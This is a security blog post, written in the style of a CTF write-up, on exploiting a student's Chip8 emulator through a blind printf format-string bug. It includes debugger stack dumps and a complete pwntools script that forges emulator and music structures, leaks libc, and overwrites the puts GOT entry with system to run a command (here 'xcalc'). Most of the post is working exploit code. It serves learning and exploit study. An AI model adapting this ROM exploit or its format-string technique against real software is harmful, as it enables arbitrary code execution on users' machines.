---
title: Pwning the Chip8 Emulator with Blind Format Strings
description: I exploit multiple vulnerabilities in a student's Chip8 emulator project as if it was a CTF, and obtain RCE
tags: binary-exploitation format-string
---

This is a continuation of my previous post, if you have not read it you can find it [here](https://lucabtz.com/blog/attempt-at-pwning-a-chip8-emulator).

As I was browsing through X I came across this [post](https://www.synacktiv.com/publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from).
When trying to exploit the emulator before I realized I could call `printf` with an arbitrary format string, I also checked 
quickly resources online, but mainly they exploit format string bugs which are not blind (you can see and read the output
of the `printf`). Here the situation is different as the output would be on the terminal of the remote computer which we can't 
read. However, as I saw the above post I realized blind format string exploits are a thing and I decided to investigate whether
they would work here.

For context I reccomend you read the post I linked as well as keep the [man page for printf](https://www.man7.org/linux/man-pages/man3/printf.3.html)
open while you read and refer to it often.

## Blind `printf` exploit

The general idea is using `printf` to first leak a `libc` address into the Chip8 memory. Then we process this using the Chip8's
assembly to compute the address of `system`. Finally we use `printf` again to overwrite the GOT entry of `puts` and we have
arbitrary code execution.

First step is placing a pointer to some Chip8 memory onto the stack. We will need this because with the format `%n`
(which is the only writing primitive in format strings) we can write only to pointers which are on the stack.

I decided to use address `0x405220` which corresponds to the VM address `0x100`. This is what the stack looks like at a `printf` call
```
pwndbg> stack 15
00:0000│ rsp 0x7ffdd9892408 —▸ 0x7fa214d6be59 (Mix_FadeInMusicPos+265) ◂— mov ebp, eax
01:0008│     0x7ffdd9892410 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
02:0010│     0x7ffdd9892418 —▸ 0x7ffdd9892450 ◂— 2
03:0018│     0x7ffdd9892420 —▸ 0x7fa214fcd000 (_rtld_global) —▸ 0x7fa214fce2e0 ◂— 0
04:0020│     0x7ffdd9892428 —▸ 0x4013fd (main+295) ◂— movzx eax, byte ptr [rip + 0x5556]
05:0028│     0x7ffdd9892430 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
06:0030│     0x7ffdd9892438 ◂— 0x254442d18
07:0038│     0x7ffdd9892440 ◂— 0x3fe0000000000000
08:0040│     0x7ffdd9892448 ◂— 0xb00000000
09:0048│     0x7ffdd9892450 ◂— 2
0a:0050│     0x7ffdd9892458 —▸ 0x7fa214b91dba (__libc_start_call_main+122) ◂— mov edi, eax
0b:0058│     0x7ffdd9892460 ◂— 0x3ada368abac064c3
0c:0060│     0x7ffdd9892468 —▸ 0x4012d6 (main) ◂— push rbp
0d:0068│     0x7ffdd9892470 ◂— 0x2bac064c3
0e:0070│     0x7ffdd9892478 —▸ 0x7ffdd9892568 —▸ 0x7ffdd989419f ◂— '/home/luca/Documents/CHIP8-Emulator-C/src/Chip8'
```
I decided to write the address `0x405220` at the stack address `0x7ffdd9892568`, which is as you can see, where the program name
is stored on the stack. To do so I used to following code
```py
    asm.write_bytes(0x0, b"%" + str(PRINTF_LEAK_ADDR).encode("ascii") + b"c%6$ln\x00")
    asm.native_call_primitive(PRINTF_PLT)
```
Here `PRINTF_LEAK_ADDR` is `0x405220`. In particular the format stores the value `0x405220` into the character counter and then
dumps it using the `%ln` format with the appropriate argument index.

Now that we have the address we want to write too we can leak there some `libc` address. In particular we have the address of
`__libc_start_call_main+122`, `0x7fa214b91dba`, on the stack. To leak this we need to use first the format `%*15$c` which
reads the argument with index 15 into the character counter. In particular the `*15$` part says that the 15th argument, which
is supposed to be an `int`, stores the value that need to be used as the field (refer to the man pages for details).
This is precisely the argument index of the `__libc_start_call_main+122` address.
Unfortunately, we do not control the type here, the value is interpreted as `int`, so we can only read the lower 32 bits. However 
this will prove sufficient, because we will just overwrite the lower 32 bits of the GOT entry of `puts`.
Further it is a signed `int` which will lead to some weirdness when the MSB of the lower 32 bits is set
(whether this is set or not depends on ASLR, so it is random).

Now that we read the value we dump it into the chip8's memory at `0x405220` using the format `%49$ln`. So the final code looks
like
```py
    asm.write_bytes(0x0, b"%*15$c%49$ln\x00")
    asm.native_call_primitive(PRINTF_PLT)
```

Now let me go back to the problem with signed `int`s. For example let me take the case where `__libc_start_call_main+122` is
`0x7ffff7bc1dba`. The lower 32 bits are `0xf7bc1dba` and thus have the sign bit set. In this case what gets written at the
leak location is the value `0x0843e246`. However after some thinking about this and how the `printf` code may work (I did not 
actually read the code) I realized that we always have `actual_lower_32_bits + leak_value = 0x100000000` (i.e. the leaked value 
is the two's complement of the real value) so that we can always recover the actual value from the leaked one anyhow. If the
sign bit is not set then the leaked value is just the real value of the lower 32 bits.

So we process the leak as follows:
- look at the page offset of the leaked value (this is independent of ASLR): if it is `0xdba` the leak is the actual value
  and we need to do nothing,
- otherwise compute the actual value by getting the two's complement.

After implementing this in the chip8's instructions, we add the offset to `system` to the leak with more instructions. 
Then we can leverage `printf` again to overwrite the lower 32-bits of some GOT entry (let me chose `puts` which is at
address `0x405038`). To keep the previous setup in place I write this to a different stack location with format strings.
```
pwndbg> stack 15
00:0000│ rsp 0x7ffc39a50a00 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
01:0008│-038 0x7ffc39a50a08 —▸ 0x7ffc39a50a40 —▸ 0x405038 (puts@got[plt]) —▸ 0x7ff7b0eb8e60 (puts) ◂— push r14
02:0010│-030 0x7ffc39a50a10 —▸ 0x7ff7b12a4000 (_rtld_global) —▸ 0x7ff7b12a52e0 ◂— 0
03:0018│-028 0x7ffc39a50a18 —▸ 0x4013fd (main+295) ◂— movzx eax, byte ptr [rip + 0x5556]
04:0020│-020 0x7ffc39a50a20 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
05:0028│-018 0x7ffc39a50a28 ◂— 0x254442d18
06:0030│-010 0x7ffc39a50a30 ◂— 0x3fe0000000000000
07:0038│-008 0x7ffc39a50a38 ◂— 0xb00000000
08:0040│ rbp 0x7ffc39a50a40 —▸ 0x405038 (puts@got[plt]) —▸ 0x7ff7b0eb8e60 (puts) ◂— push r14
09:0048│+008 0x7ffc39a50a48 —▸ 0x7ff7b0e68dba (__libc_start_call_main+122) ◂— mov edi, eax
0a:0050│+010 0x7ffc39a50a50 ◂— 0x3ada368abac064c3
0b:0058│+018 0x7ffc39a50a58 —▸ 0x4012d6 (main) ◂— push rbp
0c:0060│+020 0x7ffc39a50a60 ◂— 0x2bac064c3
0d:0068│+028 0x7ffc39a50a68 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
0e:0070│+030 0x7ffc39a50a70 —▸ 0x7ffc39a50b58 —▸ 0x405220 (chip+256) ◂— 0xffffffffb0e8f050
```
As you can see we both have the leak address and the `puts` GOT address somewhere on the stack now.

Now comes the annoying part: we need to generate the format string that will overwrite the GOT entry ourself in the chip8
program. Ideally one would use the format `%<value to write in decimal ascii>c` to load the value in the character counter.
However converting to decimal is not so easy as there is no division operation on the chip8.

What I ended up doing is checking the values bit by bit and adding the format strings `%1$<some power of 2>c`: for example the
binary number `1011` would convert to `%1$1c%1$2c%1$8c`. I also spitted the write in two steps as this seemed to work better
and it also produce smaller format strings, so each time I write only 16 bits using the format `%14$hn` (`14` references the
pointer to `puts@got[plt]` we previously written on the stack). Splitting the write in two also means we need to update this 
before the second write.

After this is done the exploit is completed using again the arbitrary call primitive to call `puts@plt` with any command we
want to run as first argument.

## Conclusion
The exploit works fully reliably, however, unless the output of the program is piped into `/dev/null` it is extremely slow as
a lot of characters need to actually be printed. This was just a learning project anyhow and I learned a lot about format string
exploits along the way, I hope at the end of this journey you have learned something to, dear reader.
Anyhow here is the exploit code which will generate a malicious ROM that spawns a calculator
```py
import pwn

# pwndbg> ptype /o struct Chip8
#/* offset      |    size */  type = struct Chip8 {
#/*      0      |    4096 */    uint8_t memory[4096];
#/*   4096      |    2048 */    uint8_t display[2048];
#/*   6144      |       2 */    uint16_t pc;
#/*   6146      |       2 */    uint16_t index;
#/*   6148      |      32 */    uint16_t stack[16];
#/*   6180      |       1 */    uint8_t stack_pointer;
#/*   6181      |       1 */    uint8_t delay;
#/*   6182      |       1 */    uint8_t sound;
#/*   6183      |      16 */    uint8_t registers[16];
#/* XXX  1-byte hole      */
#/*   6200      |       2 */    uint16_t op_code;
#/*   6202      |       1 */    uint8_t draw_flag;
#/*   6203      |       1 */    uint8_t draw_wait;
#/*   6204      |      16 */    uint8_t input[16];
#
#                               /* total size (bytes): 6220 */
#                             }


ROM_START_OFFSET   = 0x200
PRINTF_LEAK_OFFSET = 0x100

# chip struct offsets from rom start
PC_OFFSET          = 6144 - 0x200
SP_OFFSET          = 6180 - 0x200
CHIP_STRUCT_SIZE   = 6220

MUSIC_ADDR         = 0x406990
CHIP_ADDR          = 0x405120
BUFFER_START_ADDR  = CHIP_ADDR + ROM_START_OFFSET
MEMORY_END_ADDR    = CHIP_ADDR + 0x1000
STACK_ADDR         = CHIP_ADDR + 6148
PRINTF_LEAK_ADDR   = CHIP_ADDR + PRINTF_LEAK_OFFSET
PUTS_GOT_ADDR      = 0x405038

# offset of music from chip.stack
MUSIC_OFFSET       = MUSIC_ADDR - STACK_ADDR 
SP_VALUE           = int(MUSIC_OFFSET / 2)

PRINTF_PLT         = 0x401080
PUTS_PLT           = 0x4010a0

LEAK_SYSTEM_OFFSET = 0x26296

    #struct Mix_Music {
    #    Mix_MusicInterface *interface;
    #    void *context;
    #
    #    bool playing;
    #    Mix_Fading fading;
    #    int fade_step;
    #    int fade_steps;
    #
    #    char filename[1024];
    #};

    #sizeof(struct Mix_Music) = 1056
    #sizeof(struct Mix_Music) - filename = 32
    #sizeof(Mix_MusicInterface) = 224
    #offsetof(Mix_MusicInterface, SetVolume) = 56
    #offsetof(Mix_MusicInterface, Play) = 72
    #offsetof(Mix_MusicInterface, Seek) = 104
    #offsetof(Mix_MusicInterface, Stop) = 192

FAKE_MUSIC_ADDR    = 0x406a5e
INTERFACE_ADDR     = MEMORY_END_ADDR - 224
PLAY_ADDR          = INTERFACE_ADDR + 72
PLAY_CHIP_ADDR     = PLAY_ADDR - CHIP_ADDR


def pad(b, n, padding=b"A"):
    return (b + n * padding)[:n]

def read_file(filename: str):
    with open(filename, "rb") as f:
        return f.read()

class Asm:
    def __init__(self):
        self.pc = 0x200
        self.code = bytearray()
        self.patches = []
        self.labels = {}

    def _validate_addr(self, addr: int):
        if not addr & 0xfff == addr:
            print(addr)
            assert False

    def _validate_x(self, x: int):
        assert x & 0xf == x

    def _validate_nn(self, nn: int):
        assert nn & 0xff == nn

    def _increment_pc(self):
        self.pc += 2

    def _pack_opcode(self, opcode):
        return pwn.pack(opcode, word_size=16, endianness="big")

    def jump(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0x1000 | addr)

    def call(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0x2000 | addr)

    def set_index(self, addr: int):
        self._validate_addr(addr)
        self._increment_pc()
        self.code += self._pack_opcode(0xa000 | addr)

    def store_vx(self, x: int):
        self._validate_x(x)
        self._increment_pc()
        self.code += self._pack_opcode(0xf055 | (x << 8))

    def load_vx(self, x: int):
        self._validate_x(x)
        self._increment_pc()
        self.code += self._pack_opcode(0xf065 | (x << 8))

    def load_vx_imm(self, x: int, imm: int):
        self._validate_x(x)
        self._validate_nn(imm)
        self._increment_pc()
        self.code += self._pack_opcode(0x6000 | (x << 8) | imm)

    def clear_screen(self):
        self._increment_pc()
        self.code += self._pack_opcode(0x00e0)

    def set_sound(self, x: int):
        self._validate_x(x)
        self._increment_pc()
        self.code += self._pack_opcode(0xf018 | (x << 8))

    def bitwise_and(self, x: int, y: int):
        self._validate_x(x)
        self._validate_x(y)
        self._increment_pc()
        self.code += self._pack_opcode(0x8002 | (x << 8) | (y << 4))

    def bitwise_xor(self, x: int, y: int):
        self._validate_x(x)
        self._validate_x(y)
        self._increment_pc()
        self.code += self._pack_opcode(0x8003 | (x << 8) | (y << 4))

    def bitwise_shr(self, x: int, y: int):
        self._validate_x(x)
        self._validate_x(y)
        self._increment_pc()
        self.code += self._pack_opcode(0x8006 | (x << 8) | (y << 4))

    def add(self, x: int, y: int):
        self._validate_x(x)
        self._validate_x(y)
        self._increment_pc()
        self.code += self._pack_opcode(0x8004 | (x << 8) | (y << 4))
    
    def mov(self, x: int, y: int):
        self._validate_x(x)
        self._validate_x(y)
        self._increment_pc()
        self.code += self._pack_opcode(0x8000 | (x << 8) | (y << 4))

    def skip_eq(self, x: int, nn: int):
        self._validate_x(x)
        self._validate_nn(nn)
        self._increment_pc()
        self.code += self._pack_opcode(0x3000 | (x << 8) | nn)

    def skip_neq(self, x: int, nn: int):
        self._validate_x(x)
        self._validate_nn(nn)
        self._increment_pc()
        self.code += self._pack_opcode(0x4000 | (x << 8) | nn)
    
    def seek_pc(self, seeked_pc):
        self._validate_addr(seeked_pc)
        assert seeked_pc > self.pc
        assert seeked_pc % 2 == 0
        for _ in range(int((seeked_pc-self.pc)/2)):
            self.nop()
        self.pc = seeked_pc

    def label(self, name: str):
        assert name not in self.labels.keys()
        self.labels[name] = self.pc

    def jump_label(self, label: str):
        self.patches.append({
            "offset": len(self.code),
            "label": label
        })
        return self.jump(0x000)
    
    # higher level primitives
    def nop(self):
        self.jump(self.pc+2)

    def load_dword_le(self, addr: int):
        self.set_index(addr)
        self.load_vx(3)

    def store_dword_le(self, addr: int):
        self.set_index(addr)
        self.store_vx(3)

    # computes twos complement of V0-V7 and stores back there
    def two_complement(self):
        # to compute the NOT we XOR with 0xff
        self.load_vx_imm(8, 0xff)
        for i in range(4):
            self.bitwise_xor(i, 8)

        # then add 1
        self.load_vx_imm(0xf, 1)
        for i in range(4):
            self.add(i, 0xf)
    
    # adds the immediate qword to V0-V3
    def add_dwords_le_imm(self, imm: int):
        for b in range(4):
            self.load_vx_imm(8, (imm >> (b * 8)) & 0xff)
            self.add(b, 8)
            # compute carriage
            for i in range(b + 1, 4):
                self.add(i, 0xf)

    def write_qword_le(self, addr: int, qword: int):
        self.set_index(addr)
        for i in range(8):
            self.load_vx_imm(i, (qword >> (8 * i)) & 0xFF)
        self.store_vx(7)

    def write_bytes(self, addr: int, b: bytes):
        self.set_index(addr)
        for byte in b:
            self.load_vx_imm(0, byte)
            self.store_vx(0)

    def write_bytes_continue(self, b: bytes):
        for byte in b:
            self.load_vx_imm(0, byte)
            self.store_vx(0) 

    def native_call_primitive(self, address: int):
        self.write_qword_le(PLAY_CHIP_ADDR, address)
        self.load_vx_imm(0, 1)
        self.set_sound(0)
        for _ in range(11):
            self.nop()

    def assemble(self):
        for patch in self.patches:
            assert patch["label"] in self.labels.keys()
            addr = self.labels[patch["label"]]
            self.code[patch["offset"]  ] |= addr >> 8
            self.code[patch["offset"]+1] |= addr & 0xff
        return self.code

def exploit():
    pwn.info(f"Placing fake music interface object at address {hex(INTERFACE_ADDR)} (chip8 addr {hex(INTERFACE_ADDR - CHIP_ADDR)})")
    pwn.info(f"Execution starts at pc = {hex(((FAKE_MUSIC_ADDR & 0xffff) - 2) & 0xfff)}")
    pwn.info(f"Leak buffer at vm address {hex(PRINTF_LEAK_OFFSET)}, address {hex(PRINTF_LEAK_ADDR)}")

    asm = Asm()

    asm.load_vx_imm(0, 0x22)
    asm.load_vx_imm(1, 0x22)
    asm.set_index(0x40-2)
    asm.store_vx(1)
    asm.jump(0x40-2)

    asm.seek_pc(0x222)
    # at this point the machine is 'booted': profit

    # initialize puts got
    asm.write_bytes(0x0, b"pwning...\n\x00")
    asm.native_call_primitive(PUTS_PLT)

    # write on a specific location on the stack an address pointing to the chip8 memory
    # in particular let me use address PRINTF_LEAK_OFFSET which corresponds to PRINTF_LEAK_ADDR

    asm.write_bytes(0x0, b"%" + str(PRINTF_LEAK_ADDR).encode("ascii") + b"c%6$ln\x00")
    asm.native_call_primitive(PRINTF_PLT)

    asm.write_bytes(0x0, b"%*15$c%49$ln\x00")
    asm.native_call_primitive(PRINTF_PLT)

    asm.load_dword_le(PRINTF_LEAK_OFFSET)
    
    asm.mov(8, 1)
    asm.load_vx_imm(9, 0xf)
    asm.bitwise_and(8, 9)
    asm.skip_neq(8, 0xd)
    asm.skip_eq(0, 0xba)
    # should do two's complement 
    asm.jump_label("do_two_complement")
    # should not do two's complement
    asm.jump_label("done")

    asm.label("do_two_complement")
    asm.two_complement()

    asm.label("done")
    asm.add_dwords_le_imm(LEAK_SYSTEM_OFFSET)
    # for debug
    asm.store_dword_le(PRINTF_LEAK_OFFSET)

    # move them to not interfere with the write_bytes_continue
    asm.mov(0x9, 0)
    asm.mov(0xa, 1)
    asm.mov(0xb, 2)
    asm.mov(0xc, 3)
    for s in range(2):
        asm.write_bytes(0x0, b"%" + str(PUTS_GOT_ADDR + s * 2).encode("ascii") + b"c%7$ln\x00")
        asm.native_call_primitive(PRINTF_PLT)

        asm.set_index(0x0)
        for byt in range(2):
            for bit in range(8):
                exponent = bit + 8 * byt
                power = pow(2, exponent)

                asm.bitwise_shr(9 + s * 2 + byt, 9 + s * 2 + byt)
                asm.skip_eq(0xf, 1)
                asm.jump_label(f"continue_s{s}_byte{byt}_bit{bit}")

                format_string = b"%1$" + str(power).encode("ascii") + b"c"
                asm.write_bytes_continue(format_string)

                asm.label(f"continue_s{s}_byte{byt}_bit{bit}")

        asm.write_bytes_continue(b"%14$hn\x00")
        asm.native_call_primitive(PRINTF_PLT)

    asm.write_bytes(0x0, b"xcalc\x00")
    asm.native_call_primitive(PUTS_PLT)

    # more booting code
    asm.seek_pc(((FAKE_MUSIC_ADDR & 0xffff) - 2) & 0xfff)
    asm.call(0x200)

    code = asm.assemble()

    forged_chip_struct = pad(code, PC_OFFSET, padding=b"\x00")
    forged_chip_struct += pwn.p16((FAKE_MUSIC_ADDR & 0xffff) - 2) # forged pc
    forged_chip_struct += b"\x00" * (SP_OFFSET - PC_OFFSET - 2)
    forged_chip_struct += pwn.p8(SP_VALUE) # forged sp
    forged_chip_struct = pad(forged_chip_struct, CHIP_STRUCT_SIZE - ROM_START_OFFSET, padding=b"\x00")


    # interface
    forged_music_struct = pwn.p64(INTERFACE_ADDR) # put the interface into chip8's memory
    # context
    forged_music_struct += pwn.p64(CHIP_ADDR) # point context into the start of chip8's memory
    # just pad the rest of the values with zeros
    forged_music_struct = pad(forged_music_struct, 1056, padding=b"\x00")

    forged_music_interface_struct = b"\x00" * 72
    forged_music_interface_struct += pwn.p64(0x0000000000401016)
    forged_music_interface_struct = pad(forged_music_interface_struct, 224, padding=b"\x00")

    rom = forged_chip_struct
    rom += b"\x00" * (FAKE_MUSIC_ADDR - (CHIP_ADDR + ROM_START_OFFSET + len(forged_chip_struct)))
    rom += forged_music_struct

    with open("exploit", "wb") as f:
        f.write(rom)


if __name__ == "__main__":
    exploit() 
```